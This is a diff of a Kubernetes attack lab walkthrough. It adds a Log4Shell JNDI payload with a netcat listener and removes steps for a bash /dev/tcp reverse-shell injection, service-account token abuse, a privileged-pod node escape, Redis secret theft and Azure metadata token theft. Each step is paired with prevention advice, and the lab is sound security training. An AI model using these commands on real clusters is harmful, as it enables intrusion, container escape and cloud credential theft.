@@ -1,71 +1,38 @@
 # Hijack Kubernetes Hands-on
-## Play with the sample app
+
+## Hijack the container via Log4Shell
 
 <details>
 <summary>Show me the details</summary>
 
-The sample application "ping me" pings a target specified via the input field. Try the following inputs:
+The sample application provides you with an login page. We will try to inject some code here. To do so we need to first prepare our attacker machine.
+
+Execute the following snippet on your attacker machine (You have to update the IP address):
 
 ```bash
-127.0.0.1
+cd log4j-shell-poc
 
-127.0.0.1; echo "I was here"
-
-; which bash
+sudo python3 poc.py --userip 0.0.0.0 --webport 80 --lport 443 &
+sudo nc -lvnp 443
 ```
 
-<details>
-<summary>Details on how to input the snippets</summary>
+We now try to inject into the container via a reverse shell by using the known Log4Shell [(CVE-2021-44228) vulnerability](https://en.wikipedia.org/wiki/Log4Shell).
 
-1. Let's try to inject a command after the IP address: `127.0.0.1; echo "I was here"`. As you can see in the answer, it worked.
-2. Now we try whether `bash` is available: `; which bash`. And it is! Looks like we can try to hijack the container.
+Input value for the user name field (You have to update the IP address): `${jndi:ldap://0.0.0.0:1389/a}`
 
-</details>
+You can decide on the password. Then login.
+
+You now have access to the container via a reverse shell.
 
 <details>
 <summary>How to prevent this attack</summary>
 
 * Shift security left and enable [SAST scanning](https://owasp.org/www-community/Source_Code_Analysis_Tools)
 * Build secure/small container images ([distroless](https://github.com/GoogleContainerTools/distroless), less is more)
-
-</details>
-</details>
-
-## Hijack the container
-
-<details>
-<summary>Show me the details</summary>
-
-We now inject into the container via a reverse shell. Try to execute the following snippets:
-
-On your attacker machine:
-
-```bash
-sudo nc -lnvp 80
-```
-
-Input for the app (change your IP):
-
-```bash
-; bash -c 'bash -i >& /dev/tcp/0.0.0.0/80 0>&1'
-```
-
-<details>
-<summary>Details on how to hijack the container</summary>
-
-1. We will open a connection on our attacker machine using netcat: `sudo nc -lnvp 80`
-2. Now we inject the required command into our container. This will allow us to connect a reverse shell to our open connection: `; bash -c 'bash -i >& /dev/tcp/0.0.0.0/80 0>&1'`.
-3. And finally, we have a reverse shell up and running. Try some commands like `ls`
-
-</details>
-
-<details>
-<summary>How to prevent this attack</summary>
-
-* Build secure/small container images ([distroless](https://github.com/GoogleContainerTools/distroless), less is more)
 * Do not run workload as root
 * Deny egress network access on a network level as well as using [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
 * Detect untrusted process with container runtime security tools like [Falco](https://github.com/falcosecurity/falco)
+* Use a Web Application Firewall
 
 </details>
 </details>
@@ -93,44 +60,6 @@ kubectl get nodes
 
 kubectl auth can-i create pod
 ```
-
-<details>
-<summary>Details on how to access the Kubernetes API server</summary>
-
-Let's see if we can access the API server.
-
-```bash
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-
-curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api
-```
-
-It looks like we were able to authenticate and have some access. Now let's check if we have access to other pods in our namespace:
-
-``` bash
-NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
-
-curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api/v1/namespaces/$NS/pods
-```
-
-This looks good! Let's install `kubectl` for easier access:
-
-```bash
-curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
-```
-
-Let's see what we are allowed to do:
-
-```bash
-kubectl get pods
-kubectl get pods -A
-kubectl get nodes
-
-kubectl auth can-i create pod
-```
-
-</details>
 
 <details>
 <summary>How to prevent this attack</summary>
@@ -189,54 +118,6 @@ ctr --address /mnt/containerd.sock --namespace k8s.io container list
 ```
 
 <details>
-<summary>Details on how to hijack the node</summary>
-
-Let's try to create a privileged pod and "talk" to containerd:
-
-```bash
-cat <<EOF | kubectl apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: privileged-pod
-  namespace: default
-spec:
-  containers:
-  - name: shell
-    image: ubuntu:latest
-    stdin: true
-    tty: true
-    volumeMounts:
-    - mountPath: /mnt
-      name: volume
-    securityContext:
-      privileged: true
-  volumes:
-  - name: volume
-    hostPath:
-      path: /run/containerd
-EOF
-```
-
-Then we need to attach to the pod:
-
-```bash
-kubectl exec -it -n default privileged-pod /bin/bash
-```
-
-Now we can try to install some basics as well as the containerd CLI and talk to the containerd socket:
-
-```bash
-apt-get update; apt-get install -y curl jq
-
-curl -LO https://github.com/containerd/containerd/releases/download/v1.5.5/cri-containerd-cni-1.5.5-linux-amd64.tar.gz; tar -xvf cri-containerd-cni-1.5.5-linux-amd64.tar.gz
-
-ctr --address /mnt/containerd.sock --namespace k8s.io container list
-```
-
-</details>
-
-<details>
 <summary>How to prevent this attack</summary>
 
 * Deny running root containers (Tools like [OPA Gatekeeper](https://github.com/open-policy-agent/gatekeeper) and [Kyverno](https://github.com/kyverno/kyverno) can help)
@@ -274,35 +155,6 @@ REDIS_KEY=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info
 
 redis-cli -h $REDIS_HOST -a $REDIS_KEY get data
 ```
-
-<details>
-<summary>Details on how to access the secrets</summary>
-
-We will use the containerd CLI to access details of a container running on this node.
-
-First we will retrieve the container ID:
-
-```bash
-id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "docker.io/library/nginx" | awk '{print $1}')
-```
-
-And then request container runtime details such as environment variables:
-```bash
-ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
-```
-
-With those secret we can now connect to the Redis instance and retrieve some data:
-
-```bash
-apt-get install -y redis-tools
-
-REDIS_HOST=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_HOST | sed 's/^.*=//')
-REDIS_KEY=$(ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq -r .Spec.process.env[] | grep REDIS_KEY | sed 's/^.*REDIS_KEY=//')
-
-redis-cli -h $REDIS_HOST -a $REDIS_KEY get data
-```
-
-</details>
 
 <details>
 <summary>How to prevent this attack</summary>
@@ -351,48 +203,6 @@ az login --identity --username $IDENTITY
 
 az storage account list -g $RG -o table
 ```
-
-<details>
-<summary>Details on how to retrieve a Cloud provider token</summary>
-
-First, we need to mount the local node's file system to access the underlying identity ID:
-
-```bash
-mount $(df | awk '{print $1}' | grep "/dev/sd") /temp
-```
-
-We can now retrieve the cloud identity used and request a valid token via the cloud metadata service (in our case Azure Instance Metadata Service):
-
-```bash
-mkdir /temp
-mount $(df | awk '{print $1}' | grep "/dev/sd") /temp
-
-IDENTITY=$(cat /temp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
-
-TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
-
-SUBSCRIPTION=$(cat /temp/etc/kubernetes/azure.json | jq -r .subscriptionId)
-RG=$(cat /temp/etc/kubernetes/azure.json | jq -r .resourceGroup)
-
-curl -X GET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG?api-version=2021-04-01 | jq
-
-STAC=my0stac
-curl -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --data '{"sku":{"name":"Standard_LRS"},"kind":"StorageV2","location":"westeurope"}' https://management.azure.com/subscriptions/$SUBSCRIPTION/resourcegroups/$RG/providers/Microsoft.Storage/storageAccounts/$STAC?api-version=2018-02-01 | jq
-```
-
-We could now use the secret to talk to the cloud provider management plane (in this case Azure Resource Manager) and try to create or access further resources. Furthermore we were able to create an Azure Storage Account.
-
-To verify the created Storage Account we will now install the Azure CLI, authenticate and then list it:
-
-```bash
-curl -sL https://aka.ms/InstallAzureCLIDeb | bash
-
-az login --identity --username $IDENTITY
-
-az storage account list -g $RG -o table
-```
-
-</details>
 
 <details>
 <summary>How to prevent this attack</summary>
